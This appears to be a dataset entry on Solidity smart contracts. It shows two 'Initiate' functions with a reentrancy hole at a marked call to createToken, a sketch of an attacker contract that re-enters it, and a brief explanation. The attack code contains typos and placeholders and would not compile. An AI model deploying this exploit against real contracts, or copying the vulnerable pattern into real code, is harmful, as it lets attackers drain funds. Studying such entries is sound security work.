## Vulnerable Code

```javascript
**Instance_1**
function Initiate(address _swapadd, uint _amount) payable public{
        require(msg.value == _amount.mul(2));
        swap = TokenToTokenSwap_Interface(_swapadd);
        address token_address = factory.token();
        baseToken = Wrapped_Ether(token_address);
        baseToken.createToken.value(_amount.mul(2))();    //Vulnerable position         
        baseToken.transfer(_swapadd,_amount.mul(2));
        swap.createSwap(_amount, msg.sender);
}


**Instance_2**
function Initiate(uint _startDate, uint _amount) payable public{
        uint _fee = factory.fee();
        require(msg.value == _amount.mul(2) + _fee);
        address _swapadd = factory.deployContract.value(_fee)(_startDate,msg.sender);
        swap = TokenToTokenSwap_Interface(_swapadd);
        address token_address = factory.token();
        baseToken = Wrapped_Ether(token_address);
        baseToken.createToken.value(_amount.mul(2))();
        baseToken.transfer(_swapadd,_amount.mul(2));
        swap.createSwap(_amount, msg.sender);
        emit StartContract(_swapadd,_amount);
}//out2854
```



## Exploit Code

```javascript
Contract Attack{
    uint count;
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }
    funciton createToken() payable{
        count++;
        if(count < 5){
            victimAddress.call(byte4(keccak256(“Initiate(address, uint)”)), ..., ...);
        }
    }
    function() payable{

    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of Vulnerable position: IF the object of 'baseToken' is a malicious object, the method of "createToken" can be a malicious function to reentrancy. ps:"...." represent an appropriate paramete.
